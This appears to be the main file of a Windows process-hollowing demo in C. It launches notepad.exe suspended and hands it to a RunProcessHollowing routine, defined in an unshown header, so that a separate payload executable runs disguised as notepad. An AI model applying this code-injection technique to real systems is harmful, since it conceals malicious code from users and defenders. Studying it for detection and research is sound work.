#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "hollowing.h"

int main() {
    PAYLOAD_INFO payload = { 0 };

    if (!ParsePayload("bin\\payload.exe", &payload)) {
        fprintf(stderr, "Failed to parse payload\n");
        return EXIT_FAILURE;
    }

    STARTUPINFO si = { 0 };
    si.cb = sizeof(si);

    PROCESS_INFORMATION pi;

    if (!CreateProcessA(
        "C:\\WINDOWS\\system32\\notepad.exe",
        NULL, NULL, NULL, FALSE, CREATE_SUSPENDED,
        NULL, NULL, &si, &pi)
    ) {
        fprintf(stderr, "Error: Failed to create process: error %lu\n", GetLastError());
        free(payload.buffer);
        return EXIT_FAILURE;
    }

    printf("Target process created suspended with PID: %lu\n", pi.dwProcessId);

    if (!RunProcessHollowing(&pi, &payload)) {
        fprintf(stderr, "Error: Process hollowing failed\n");
        free(payload.buffer);
        TerminateProcess(pi.hProcess, 0);
        return EXIT_FAILURE;
    }
    printf("Check now in task manager to see the process\n");
    getchar();

    free(payload.buffer);
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return EXIT_SUCCESS;
}